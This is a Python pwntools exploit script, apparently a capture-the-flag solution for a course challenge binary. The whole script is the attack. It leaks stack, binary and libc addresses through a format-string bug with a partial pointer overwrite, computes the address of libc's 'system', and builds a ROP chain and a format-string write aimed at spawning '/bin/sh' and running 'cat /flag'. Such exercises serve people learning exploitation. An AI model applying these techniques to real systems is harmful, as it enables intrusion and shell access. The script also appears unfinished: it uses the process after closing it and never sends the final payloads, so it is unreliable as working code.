import pwnlib.elf
import pwnlib.rop.rop
import pwnlib.tubes.remote
import pwnlib.context
import pwnlib.fmtstr
import pwnlib.gdb

pwnlib.context.context.clear(arch='amd64', os='linux')
pwnlib.context.context.terminal = ["tmux", "splitw", "-h"]

def read_menu(conn):
    for _ in range(4):
        conn.recvline()

def save_buffer(conn, buff):
    conn.sendline(b'1') # goto edit text
    conn.send(buff) # send the payload
    conn.recvline() # done
    read_menu(conn)
    conn.sendline(b'2') # save the message in stack
    conn.recvline() # Saved the current text!
    read_menu(conn)

# Read the ELF for RDI register ROP
chall = pwnlib.elf.ELF('apps/chall')
libc = pwnlib.elf.ELF('apps/libc-chall.so')

try_counter = 0
while True:
    try_counter += 1
    print("Try number", try_counter)
    # Connect to remote server and get the main address
    #with pwnlib.tubes.remote.remote('ce441-pwn3.pwni.top', 3137) as r:
    #with pwnlib.tubes.remote.remote('localhost', 3137) as r:
    with pwnlib.tubes.process.process('./apps/chall') as r:
        r.recvline() # welcome text
        read_menu(r)

        # Send payload
        payload = bytearray()
        payload += b'cat /flag ' # what system will run
        # %6$p is the frame pointer of show error
        # %7$p is the return address of show error
        # 7 + 0x120/8 = 43
        # A little adjustments for frame pointer and etc results in
        # %45$p is the return to libc
        # %10$p and %11$p are the buffer in stack
        payload += b'|%6$p| |%7$p| |%45$p| |%10$p %11$p|\n\0'
        payload += ('a' * (255 - len(payload))).encode('ascii')
        payload += b'\0\x20\x50' # partial overwrite the address to text and hope for the best
        assert len(payload) == 256 + 2
        save_buffer(r, payload)

        # Trigger the bug
        r.sendline(b'4')
        try:
            line = r.recvline()
            if line.startswith(b'> cat /flag '):
                print(line)
                line_split = line.split(b'|')
                return_error_frame_address = int(line_split[1], 16)
                return_to_main_address = int(line_split[3], 16)
                return_to_libc_address = int(line_split[5], 16)
            else:
                print("Close call:", line)
                continue
        except EOFError:
            continue
    print("Return error stack frame", hex(return_error_frame_address))
    print("Return to main at", hex(return_to_main_address))
    print("Return to libc at", hex(return_to_libc_address))
    # Adjust the offsets
    chall.address = return_to_main_address - (chall.functions['main'].address + 184) # from GDB
    # Tof khales
    # p &__libc_start_call_main - &system = -159840
    # __libc_start_call_main+128 is return_to_libc_address
    # __libc_start_call_main is return_to_libc_address-128
    # __libc_start_call_main - system is -159840
    # return_to_libc_address-128 + 159840 is system
    libc.address += (return_to_libc_address-128+159840) - libc.functions['system'].address
    print("Main at", hex(chall.functions['main'].address))
    print("libc system at", hex(libc.functions['system'].address))

    # Build ROP chain to just move the 
    binsh = next(libc.search(b'/bin/sh\x00'))
    rop = pwnlib.rop.rop.ROP(libc)
    rop.system(binsh)
    print(rop.dump())
    print(len(bytes(rop)), bytes(rop))

    # Build the payload to change the buffer
    payload = pwnlib.fmtstr.fmtstr_payload(10, {return_error_frame_address : libc.sym['system']})
    print("printf payload with len", len(payload), ":", payload)
    assert len(payload) < 250

    # Change the buffer again
    r.interactive()
    save_buffer(r, b'hello world\n')

    exit()